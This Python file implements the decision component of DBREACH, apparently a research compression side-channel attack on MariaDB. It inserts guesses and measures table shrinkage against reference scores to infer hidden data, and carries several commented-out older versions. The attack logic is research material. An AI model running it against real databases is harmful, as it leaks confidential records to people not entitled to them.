## Decision Attacker with Grouping

import dbreacher
import string

class decisionAttacker():
    def __init__(self, dbreacher : dbreacher.DBREACHer, guesses):
        self.n = len(guesses)
        self.guesses = guesses
        self.dbreacher = dbreacher
        self.bytesShrunk = dict()
        self.bYesReferenceScores = dict()
        self.bNoReferenceScores = dict()

    def setUp(self) -> bool:
        success = self.dbreacher.reinsertFillers()
        self.bytesShrunk = dict()
        self.bYesReferenceScores = dict()
        self.bNoReferenceScores = dict()
        return success
    
    def tryGroupedGuesses(self, guesses_grouped, verbose = False) -> bool:
        # print(guesses_grouped)
        for guess in guesses_grouped:
            if len(guess) not in self.bYesReferenceScores:
                try:
                    b_yes = self.dbreacher.getSYesReferenceScore(len(guess)) 
                    b_no = self.dbreacher.getSNoReferenceScore(len(guess), string.ascii_lowercase)
                except RuntimeError:
                    return False
                self.bYesReferenceScores[len(guess)] = b_yes
                self.bNoReferenceScores[len(guess)] = b_no
            shrunk = self.dbreacher.insertGuessAndCheckIfShrunk(guess)
            if shrunk:
                return False
            while not shrunk:
                shrunk = self.dbreacher.addCompressibleByteAndCheckIfShrunk(guess)
            score = self.dbreacher.getBytesShrunkForCurrentGuess()
            if verbose:
                print("\"" + guess + "\" bytesShrunk = " + str(score))
            self.bytesShrunk[guess] = score
        return True

    def tryAllGuesses(self, verbose = False) -> bool:
        for guess in self.guesses:
            if len(guess) not in self.bYesReferenceScores:
                try:
                    b_yes = self.dbreacher.getSYesReferenceScore(len(guess)) 
                    b_no = self.dbreacher.getSNoReferenceScore(len(guess), string.ascii_lowercase)
                except RuntimeError:
                    return False
                self.bYesReferenceScores[len(guess)] = b_yes
                self.bNoReferenceScores[len(guess)] = b_no
            shrunk = self.dbreacher.insertGuessAndCheckIfShrunk(guess)
            if shrunk:
                return False
            while not shrunk:
                shrunk = self.dbreacher.addCompressibleByteAndCheckIfShrunk(guess)
            score = self.dbreacher.getBytesShrunkForCurrentGuess()
            if verbose:
                print("\"" + guess + "\" bytesShrunk = " + str(score))
            self.bytesShrunk[guess] = score
        return True

    # returns (b_no, b_guess, b_yes) for each guess, normalized such that min(b_no, b_guess, b_yes) is always zero
    def getGuessAndReferenceScores(self):
        bytesList = [(item[1], item[0]) for item in self.bytesShrunk.items()]
        guessScoreTuples = []
        for b, g in bytesList:
            bYes = self.bYesReferenceScores[len(g)]
            bNo = self.bNoReferenceScores[len(g)]
            min_b = min(bNo, min(b, bYes))
            guessScoreTuples.append((g, (bNo - min_b, b - min_b, bYes - min_b)))
        return guessScoreTuples
    
## Old Decision Attacker

# import dbreacher
# import string

# class decisionAttacker():
#     def __init__(self, dbreacher : dbreacher.DBREACHer, guesses):
#         self.n = len(guesses)
#         self.guesses = guesses
#         self.dbreacher = dbreacher
#         self.bytesShrunk = dict()
#         self.bYesReferenceScores = dict()
#         self.bNoReferenceScores = dict()

#     def setUp(self) -> bool:
#         success = self.dbreacher.reinsertFillers()
#         self.bytesShrunk = dict()
#         self.bYesReferenceScores = dict()
#         self.bNoReferenceScores = dict()
#         return success

#     def tryAllGuesses(self, verbose = False) -> bool:
#         for guess in self.guesses:
#             if len(guess) not in self.bYesReferenceScores:
#                 try:
#                     b_yes = self.dbreacher.getSYesReferenceScore(len(guess)) 
#                     b_no = self.dbreacher.getSNoReferenceScore(len(guess), string.ascii_lowercase)
#                 except RuntimeError:
#                     return False
#                 self.bYesReferenceScores[len(guess)] = b_yes
#                 self.bNoReferenceScores[len(guess)] = b_no
#             shrunk = self.dbreacher.insertGuessAndCheckIfShrunk(guess)
#             if shrunk:
#                 return False
#             while not shrunk:
#                 shrunk = self.dbreacher.addCompressibleByteAndCheckIfShrunk()
#             score = self.dbreacher.getBytesShrunkForCurrentGuess()
#             if verbose:
#                 print("\"" + guess + "\" bytesShrunk = " + str(score))
#             self.bytesShrunk[guess] = score
#         return True

#     # returns (b_no, b_guess, b_yes) for each guess, normalized such that min(b_no, b_guess, b_yes) is always zero
#     def getGuessAndReferenceScores(self):
#         bytesList = [(item[1], item[0]) for item in self.bytesShrunk.items()]
#         guessScoreTuples = []
#         for b, g in bytesList:
#             bYes = self.bYesReferenceScores[len(g)]
#             bNo = self.bNoReferenceScores[len(g)]
#             min_b = min(bNo, min(b, bYes))
#             guessScoreTuples.append((g, (bNo - min_b, b - min_b, bYes - min_b)))
#         return guessScoreTuples


# import dbreacher
# import string
# import utils.mariadb_utils as utils

# control = utils.MariaDBController("testdb")

# class decisionAttacker():
#     def __init__(self, dbreacher : dbreacher.DBREACHer, guesses):
#         self.n = len(guesses)
#         self.guesses = guesses
#         self.dbreacher = dbreacher
#         self.bytesShrunk = dict()
#         self.bYesReferenceScores = dict()
#         self.bNoReferenceScores = dict()

#     def setUp(self) -> bool:
#         success = self.dbreacher.reinsertFillers()
#         self.bytesShrunk = dict()
#         self.bYesReferenceScores = dict()
#         self.bNoReferenceScores = dict()
#         return success
    
#     def getRelativeReferenceScore(self, length):
#         relativeLengths = {}
#         for i in range(length-1, length+2):
#             if i in self.bYesReferenceScores:
#                 relativeLengths[i] = abs(length-i)
#         sortLengths = sorted(relativeLengths, key=relativeLengths.get)
#         return sortLengths[0]
    
#     def findRelativeReferenceScores(self, length):
#         for i in range(length-1, length+2):
#             if i in self.bYesReferenceScores:
#                 return True
#         return False

#     # def tryAllGuesses(self, verbose = False) -> bool:
#     #     for guess in self.guesses:
#     #         # control.delete_guess("victimtable", guess)
#     #         # if len(guess) not in self.bYesReferenceScores:
#     #         #     try:
#     #         #         b_yes = self.dbreacher.getSYesReferenceScore(len(guess)) 
#     #         #         b_no = self.dbreacher.getSNoReferenceScore(len(guess), string.ascii_lowercase)
#     #         #     except RuntimeError:
#     #         #         #print("table shrunk too early on reference score guess")
#     #         #         return False
#     #         #     self.bYesReferenceScores[len(guess)] = b_yes
#     #         #     self.bNoReferenceScores[len(guess)] = b_no
#     #         hasRelativeScore = self.findRelativeReferenceScores(len(guess))
#     #         if not hasRelativeScore:
#     #             try:
#     #                 b_yes = self.dbreacher.getSYesReferenceScore(len(guess)) 
#     #                 b_no = self.dbreacher.getSNoReferenceScore(len(guess), string.ascii_lowercase)
#     #             except RuntimeError:
#     #                 #print("table shrunk too early on reference score guess")
#     #                 return False
#     #             self.bYesReferenceScores[len(guess)] = b_yes
#     #             self.bNoReferenceScores[len(guess)] = b_no
#     #         shrunk = self.dbreacher.insertGuessAndCheckIfShrunk(guess)
#     #         if shrunk:
#     #             #print("table shrunk too early on guess " + guess)
#     #             return False
#     #         # control.delete_guess("victimtable", guess)
#     #         while not shrunk:
#     #             shrunk = self.dbreacher.addCompressibleByteAndCheckIfShrunk()
#     #         # print("Guess Bytes: " + str(self.dbreacher.bytesShrunkForCurrentGuess))
#     #         score = self.dbreacher.getBytesShrunkForCurrentGuess()
#     #         if verbose:
#     #             print("\"" + guess + "\" bytesShrunk = " + str(score))
#     #         self.bytesShrunk[guess] = score
#     #     return True

#     # # returns (b_no, b_guess, b_yes) for each guess, normalized such that min(b_no, b_guess, b_yes) is always zero
#     # def getGuessAndReferenceScores(self):
#     #     bytesList = [(item[1], item[0]) for item in self.bytesShrunk.items()]
#     #     guessScoreTuples = []
#     #     for b, g in bytesList:
#     #         bYes = 0
#     #         bNo = 0
#     #         if len(g) in self.bYesReferenceScores:
#     #             bYes = self.bYesReferenceScores[len(g)]
#     #             bNo = self.bNoReferenceScores[len(g)]
#     #         else:
#     #             index = self.getRelativeReferenceScore(len(g))
#     #             bYes = self.bYesReferenceScores[index]
#     #             bNo = self.bNoReferenceScores[index]
#     #         min_b = min(bNo, min(b, bYes))
#     #         guessScoreTuples.append((g, (bNo - min_b, b - min_b, bYes - min_b)))
#     #     return guessScoreTuples

#     def tryAllGuesses(self, verbose = False) -> bool:
#         for guess in self.guesses:
#             # control.delete_guess("victimtable", guess)
#             # if len(guess) not in self.bYesReferenceScores and len(guess)+3 not in self.bYesReferenceScores and len(guess)-3 not in self.bYesReferenceScores:
#             hasRelativeScore = self.findRelativeReferenceScores(len(guess))
#             if not hasRelativeScore:
#                 try:
#                     b_yes = self.dbreacher.getSYesReferenceScore(len(guess)) 
#                     b_no = self.dbreacher.getSNoReferenceScore(len(guess), string.ascii_lowercase)
#                 except RuntimeError:
#                     #print("table shrunk too early on reference score guess")
#                     return False
#                 self.bYesReferenceScores[len(guess)] = b_yes
#                 self.bNoReferenceScores[len(guess)] = b_no
#             shrunk = self.dbreacher.insertGuessAndCheckIfShrunk(guess)
#             if shrunk:
#                 #print("table shrunk too early on guess " + guess)
#                 return False
#             # control.delete_guess("victimtable", guess)
#             while not shrunk:
#                 shrunk = self.dbreacher.addCompressibleByteAndCheckIfShrunk()
#             score = self.dbreacher.getBytesShrunkForCurrentGuess()
#             if verbose:
#                 print("\"" + guess + "\" bytesShrunk = " + str(score))
#             self.bytesShrunk[guess] = score
#         return True

#     # returns (b_no, b_guess, b_yes) for each guess, normalized such that min(b_no, b_guess, b_yes) is always zero
#     def getGuessAndReferenceScores(self):
#         bytesList = [(item[1], item[0]) for item in self.bytesShrunk.items()]
#         guessScoreTuples = []
#         for b, g in bytesList:
#             bYes = 0
#             bNo = 0
#             if len(g) in self.bYesReferenceScores:
#                 bYes = self.bYesReferenceScores[len(g)]
#                 bNo = self.bNoReferenceScores[len(g)]
#             else:
#                 index = self.getRelativeReferenceScore(len(g))
#                 bYes = self.bYesReferenceScores[index]
#                 bNo = self.bNoReferenceScores[index]
#             min_b = min(bNo, min(b, bYes))
#             guessScoreTuples.append((g, (bNo - min_b, b - min_b, bYes - min_b)))
#         return guessScoreTuples

# import dbreacher
# import string
# import utils.mariadb_utils as utils
# import numpy as np

# control = utils.MariaDBController("testdb")

# class decisionAttacker():
#     def __init__(self, dbreacher : dbreacher.DBREACHer, guesses):
#         self.n = len(guesses)
#         self.guesses = guesses
#         self.dbreacher = dbreacher
#         self.bytesShrunk = dict()
#         self.bYesReferenceScores = dict()
#         self.bNoReferenceScores = dict()

#     def setUp(self) -> bool:
#         success = self.dbreacher.reinsertFillers()
#         self.bytesShrunk = dict()
#         self.bYesReferenceScores = dict()
#         self.bNoReferenceScores = dict()
#         return success
    
#     def getRelativeReferenceScore(self, length):
#         relativeLengths = {}
#         for i in range(length-4, length+5):
#             if i in self.bYesReferenceScores:
#                 relativeLengths[i] = abs(length-i)
#         sortLengths = sorted(relativeLengths, key=relativeLengths.get)
#         return sortLengths[0]
    
#     def findRelativeReferenceScores(self, length):
#         for i in range(length-4, length+5):
#             if i in self.bYesReferenceScores:
#                 return True
#         return False

    # def tryAllGuesses(self, verbose = False) -> bool:
    #     for guess in self.guesses:
    #         # control.delete_guess("victimtable", guess)
    #         # if len(guess) not in self.bYesReferenceScores and len(guess)+3 not in self.bYesReferenceScores and len(guess)-3 not in self.bYesReferenceScores:
    #         hasRelativeScore = self.findRelativeReferenceScores(len(guess))
    #         if not hasRelativeScore:
    #             try:
    #                 b_yes = self.dbreacher.getSYesReferenceScore(len(guess)) 
    #                 b_no = self.dbreacher.getSNoReferenceScore(len(guess), string.ascii_lowercase)
    #             except RuntimeError:
    #                 #print("table shrunk too early on reference score guess")
    #                 return False
    #             self.bYesReferenceScores[len(guess)] = b_yes
    #             self.bNoReferenceScores[len(guess)] = b_no
    #         shrunk = self.dbreacher.insertGuessAndCheckIfShrunk(guess)
    #         if shrunk:
    #             #print("table shrunk too early on guess " + guess)
    #             return False
    #         # control.delete_guess("victimtable", guess)
    #         while not shrunk:
    #             shrunk = self.dbreacher.addCompressibleByteAndCheckIfShrunk()
    #         score = self.dbreacher.getBytesShrunkForCurrentGuess()
    #         if verbose:
    #             print("\"" + guess + "\" bytesShrunk = " + str(score))
    #         self.bytesShrunk[guess] = score
    #     return True

    # # returns (b_no, b_guess, b_yes) for each guess, normalized such that min(b_no, b_guess, b_yes) is always zero
    # def getGuessAndReferenceScores(self):
    #     bytesList = [(item[1], item[0]) for item in self.bytesShrunk.items()]
    #     guessScoreTuples = []
    #     for b, g in bytesList:
    #         bYes = 0
    #         bNo = 0
    #         if len(g) in self.bYesReferenceScores:
    #             bYes = self.bYesReferenceScores[len(g)]
    #             bNo = self.bNoReferenceScores[len(g)]
    #         else:
    #             index = self.getRelativeReferenceScore(len(g))
    #             bYes = self.bYesReferenceScores[index]
    #             bNo = self.bNoReferenceScores[index]
    #         min_b = min(bNo, min(b, bYes))
    #         guessScoreTuples.append((g, (bNo - min_b, b - min_b, bYes - min_b)))
    #     return guessScoreTuples
    
## BINARY SEARCH AND NORMAL VERSION 

# import dbreacher
# import string
# import utils.mariadb_utils as utils
# import numpy as np

# control = utils.MariaDBController("testdb")

# class decisionAttacker():
#     def __init__(self, dbreacher : dbreacher.DBREACHer, guesses):
#         self.n = len(guesses)
#         self.guesses = guesses
#         self.dbreacher = dbreacher
#         self.bytesShrunk = dict()
#         self.bYesReferenceScores = dict()
#         self.bNoReferenceScores = dict()

#     def setUp(self) -> bool:
#         success = self.dbreacher.reinsertFillers()
#         self.bytesShrunk = dict()
#         self.bYesReferenceScores = dict()
#         self.bNoReferenceScores = dict()
#         return success
    
#     def getRelativeReferenceScore(self, length):
#         relativeLengths = {}
#         for i in range(length-4, length+5):
#             if i in self.bYesReferenceScores:
#                 relativeLengths[i] = abs(length-i)
#         sortLengths = sorted(relativeLengths, key=relativeLengths.get)
#         return sortLengths[0]
    
#     def findRelativeReferenceScores(self, length):
#         for i in range(length-4, length+5):
#             if i in self.bYesReferenceScores:
#                 return True
#         return False

#     def tryAllGuesses(self, verbose = False) -> bool:
#         for guess in self.guesses:
#             # control.delete_guess("victimtable", guess)
#             if len(guess) not in self.bYesReferenceScores:
#                 try:
#                     b_yes = self.dbreacher.getSYesReferenceScore(len(guess)) 
#                     b_no = self.dbreacher.getSNoReferenceScore(len(guess), string.ascii_lowercase)
#                 except RuntimeError:
#                     #print("table shrunk too early on reference score guess")
#                     return False
#                 self.bYesReferenceScores[len(guess)] = b_yes
#                 self.bNoReferenceScores[len(guess)] = b_no
#             shrunk = self.dbreacher.insertGuessAndCheckIfShrunk(guess)
#             if shrunk:
#                 #print("table shrunk too early on guess " + guess)
#                 return False
#             # control.delete_guess("victimtable", guess)
#             while not shrunk:
#                 shrunk = self.dbreacher.addCompressibleByteAndCheckIfShrunk()
#             score = self.dbreacher.getBytesShrunkForCurrentGuess()
#             if verbose:
#                 print("\"" + guess + "\" bytesShrunk = " + str(score))
#             self.bytesShrunk[guess] = score
#         return True

#     # returns (b_no, b_guess, b_yes) for each guess, normalized such that min(b_no, b_guess, b_yes) is always zero
#     def getGuessAndReferenceScores(self):
#         bytesList = [(item[1], item[0]) for item in self.bytesShrunk.items()]
#         guessScoreTuples = []
#         for b, g in bytesList:
#             bYes = self.bYesReferenceScores[len(g)]
#             bNo = self.bNoReferenceScores[len(g)]
#             min_b = min(bNo, min(b, bYes))
#             guessScoreTuples.append((g, (bNo - min_b, b - min_b, bYes - min_b)))
#         return guessScoreTuples